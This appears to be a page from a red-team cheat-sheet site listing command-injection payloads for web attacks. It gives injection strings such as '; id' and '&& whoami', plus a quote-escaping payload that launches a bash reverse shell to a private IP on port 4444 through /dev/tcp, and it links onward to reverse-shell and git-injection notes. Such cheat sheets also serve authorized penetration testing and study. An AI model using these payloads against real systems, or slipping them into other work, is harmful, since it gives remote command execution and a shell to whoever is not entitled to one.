---
title: Command Injection
parent: Web Attack
grand_parent: Red Team
---


<details markdown="1">
<summary>Command Injection</summary>

```bash
; id
```

```zsh
&& whoami
```

```bash
"; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' ; #"
```
→ If vulnerable → [Reverse Shell](../03_initial_access/reverse_shell.md)

#### Example:
-  [git command](../99_attack_repo/01-50_web/01_web_command-injection_git.md)

</details>
